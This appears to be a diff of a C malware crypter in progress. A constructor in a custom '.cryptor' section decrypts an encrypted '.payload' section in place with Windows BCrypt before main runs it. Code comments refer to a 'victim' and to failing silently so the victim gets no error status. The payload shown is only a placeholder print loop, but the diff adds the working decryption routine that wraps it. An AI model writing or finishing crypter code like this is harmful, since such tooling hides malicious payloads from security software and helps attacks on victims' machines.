@@ -103,6 +103,7 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 	 */
 	BCRYPT_ALG_HANDLE decryptPayloadKeyAlg;
 	BCRYPT_KEY_HANDLE decryptPayloadKey;
+	ULONG PAYLOAD_WRITE_LEN;
 	/*
 	* retrieving the public key
 	* in the event of an error silently exit 0. No reason to provide a return status to a victim
@@ -275,7 +276,7 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 	 * Set the mode for decryption to GCM, the GCM provider works for both pycryptodome and 
 	 * the microsft bcrypt C cryptographic provider. 
 	 */
-	if(BCryptSetProperty(decryptPayloadKeyAlg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM,sizeof(BCRYPT_CHAIN_MODE_GCM),0) != STATUS_SUCCESS)
+	if(BCryptSetProperty(decryptPayloadKeyAlg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_CFB,sizeof(BCRYPT_CHAIN_MODE_CFB),0) != STATUS_SUCCESS)
 	{
 		printf ("failed to set the chaining mode to OFB");
 		exit(-1);
@@ -288,6 +289,23 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 	
 	payload_size = addr_e-addr_s;
 	ptr_payload = (BYTE*)addr_s;
+/*	for(int x = 0; x<payload_size; x++)
+	{
+		printf("%02x ", *(ptr_payload+x));
+	}
+*/	
+	if(BCryptDecrypt(decryptPayloadKey,ptr_payload,payload_size,NULL,decodedIV,sz,ptr_payload,payload_size,&PAYLOAD_WRITE_LEN,0) != STATUS_SUCCESS)
+	{
+			printf("failed to decrypt payload");
+		exit(-1);
+	}
+			
+	payload_size = addr_e-addr_s;
+	ptr_payload = (BYTE*)addr_s;
+	for(int x = 0; x<payload_size; x++)
+	{
+		printf("%02x ", *(ptr_payload+x));
+	}
 	//if(BCryptDeriveKey
 	/** TODO
 	 *  DECYPT PAYLOAD
@@ -314,7 +332,7 @@ __attribute__((destructor(101),section(".cryptor"))) int destruct(){
 }
 
 
-__attribute__((section(".payload"))) void payolad(){
+__attribute__((section(".payload"))) int payload(){
 	for (int x = 0; x < 21; x++){
 		printf("here");
 	}
@@ -322,5 +340,5 @@ __attribute__((section(".payload"))) void payolad(){
 
 int main()
 {
-return 0;//payolad();
+return payload();
 }
